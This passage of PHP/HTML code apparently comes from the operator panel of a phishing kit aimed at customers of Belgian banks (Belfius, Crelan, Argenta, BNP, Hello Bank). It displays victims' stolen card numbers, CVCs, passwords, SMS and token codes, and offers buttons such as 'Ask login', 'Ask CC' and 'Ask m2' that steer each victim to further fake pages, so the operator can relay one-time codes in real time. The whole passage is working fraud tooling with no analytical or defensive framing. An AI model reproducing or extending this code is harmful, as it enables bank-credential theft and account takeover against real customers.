                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_pass"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_live"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_live"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_buy"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">buy:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_buy"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_cc"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cc card:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_cc"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_cc_exp"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cc exp:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_cc_exp"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_cvc"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cc cvc:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_cvc"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_bel"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_bel"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if ($log["waiting"] == "true") {
                            ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Ask phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i> Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'loginCode')"><i class="far fa-keyboard"></i> Ask sms</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'password')"><i class="fa fa-info-circle"></i> Ask password</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'credit')"><i class="far fa-credit-card"></i> Ask CC</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>
                        <hr>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m1</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control belfius-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                      
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'token')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m2</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control belfius-two input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a m2 code">
                            </div>
                        </div> 
                        
<hr>

                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask live</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control belfius-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a live code">
                                <input type="text" class="form-control belfius-live-two input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a live code">
                            </div>
           
</div>
            
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBelfius('<?php 
                            echo htmlspecialchars($log["user_id"]);
                            ?>
', 'buy')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask buy</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control belfius-buy input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a buy code">                           
                                <input type="text" class="form-control belfius-buy-two input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a buy code">
                            </div>
                        </div> 
        

 
                    </div>
                </div
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                

                <?php 
                        }
                    } else {
                        if ($log["bank"] == "CRELAN") {
                            if (!empty($log["crelan_id"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">id Number:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["crelan_id"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["crelan_serie"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Seri Number:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["crelan_serie"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_m1"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M1: </label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_m1"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["crelan_token"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Token:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["crelan_token"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["crelan_token2_get"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Token2:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["crelan_token2_get"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["crelan_token3_get"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Token3:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["crelan_token3_get"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_pass"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Password:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_pass"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_live"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_live"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_buy"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">buy:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_buy"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_cc"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cc card:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_cc"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_cc_exp"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cc exp:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_cc_exp"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_cvc"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cc cvc:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_cvc"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if (!empty($log["belfius_bel"])) {
                                echo "<div class=\"form-group row\">";
                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                                echo "<div class=\"col-sm-9\">";
                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_bel"]) . "</i></p>";
                                echo "</div>";
                                echo "</div>";
                            }
                            if ($log["waiting"] == "true") {
                                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setCrelan('<?php 
                                echo htmlspecialchars($log["user_id"]);
                                ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setCrelan('<?php 
                                echo htmlspecialchars($log["user_id"]);
                                ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Ask Token</button>
                            </div>
                           
                            
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setCrelan('<?php 
                                echo htmlspecialchars($log["user_id"]);
                                ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>
                        <hr>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setCrelan('<?php 
                                echo htmlspecialchars($log["user_id"]);
                                ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask Token2</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control crelan-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a Token2 code">
                            </div>
                        </div>
                      
                     
                        <div class="row">
                         

                            <div class="col-lg-9">
                                <input type="hidden" class="form-control crelan-two input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a m2 code">
                            </div>
                        </div> 
                        
<hr>

                        <div class="row">
                           
                            <div class="col-lg-9">
                                <input type="hidden" class="form-control crelan-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a live code">
                                <input type="hidden" class="form-control crelan-live-two input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a live code">
                            </div>
           
</div>
            

                        <div class="row">
                         
                            <div class="col-lg-9">
                                <input type="hidden" class="form-control crelan-buy input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a buy code">                           
                                <input type="hidden" class="form-control crelan-buy-two input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a buy code">
                            </div>
                        </div> 
        

 
                    </div>
                </div
                
                
                
                
                
                
                
                
                
                
                
                
                
                >
                <?php 
                            }
                        } else {
                            if ($log["bank"] == "ARGENTA") {
                                if (!empty($log["argenta_card"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">cardnumber:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_card"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_vv"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Expiry:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_vv"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_m1"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M1:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_m1"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_phone"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">phone:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_phone"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_sms"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_sms"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_live"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">live Code:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_live"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_cc"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC nummer:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_cc"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_exp"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC EXP:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_exp"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if (!empty($log["argenta_cvc"])) {
                                    echo "<div class=\"form-group row\">";
                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CVC:</label>";
                                    echo "<div class=\"col-sm-9\">";
                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["argenta_cvc"]) . "</i></p>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                                if ($log["waiting"] == "true") {
                                    ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'identification')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask sms</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'loginCode')"><i class="fa fa-phone"></i> phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'bel')"><i class="fa fa-phone"></i> Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'credit')"><i class="far fa-keyboard"></i> CC</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>  
                        <hr>    
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask M1</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control argenta-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>   
                       
<hr>
                        
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setArgenta('<?php 
                                    echo htmlspecialchars($log["user_id"]);
                                    ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i>Live</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control argenta-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="text" class="form-control argenta-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                        </div>
                        </div>   


                    </div>
                </div>









                <?php 
                                }
                            } else {
                                if ($log["bank"] == "BNP") {
                                    if (!empty($log["bnp_card"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">card:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_card"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_client"]) && !empty($log["bnp_vv"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">clientid:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_client"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Expiry:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_vv"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_m1"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M1 Code:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_m1"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_phone"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Phone:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_phone"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_sms"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_sms"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_m2"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">m2 code:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_m2"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_live"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live code:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_live"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_cc"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC nummer:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_cc"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_exp"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC exp:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_exp"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_cvc"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CVC:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_cvc"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if (!empty($log["bnp_bel"])) {
                                        echo "<div class=\"form-group row\">";
                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                                        echo "<div class=\"col-sm-9\">";
                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bnp_bel"]) . "</i></p>";
                                        echo "</div>";
                                        echo "</div>";
                                    }
                                    if ($log["waiting"] == "true") {
                                        ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Ask phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i> Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'loginCode')"><i class="far fa-keyboard"></i>Ask SMS Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'credit')"><i class="far fa-keyboard"></i>Ask CC</button>
                            </div>

                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>
                        <hr>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m1</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control bnp-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'sign2')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m2</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control bnp-m2-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBnp('<?php 
                                        echo htmlspecialchars($log["user_id"]);
                                        ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i>Live</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control bnp-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="text" class="form-control bnp-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                       
                     


                    </div>
                </div>                                 
                    </div>
                </div>

































































                
                <?php 
                                    }
                                } else {
                                    if ($log["bank"] == "HELLOBANK") {
                                        if (!empty($log["hello_card"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">card:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_card"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_client"]) && !empty($log["hello_vv"])) {
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">clientid:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_client"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                            echo "<div class=\"form-group row\">";
                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Expiry:</label>";
                                            echo "<div class=\"col-sm-9\">";
                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["hello_vv"]) . "</i></p>";
                                            echo "</div>";
                                            echo "</div>";
                                        }
                                        if (!empty($log["hello_m1"])) {
                                            echo "<div class=\"form-group row\">";
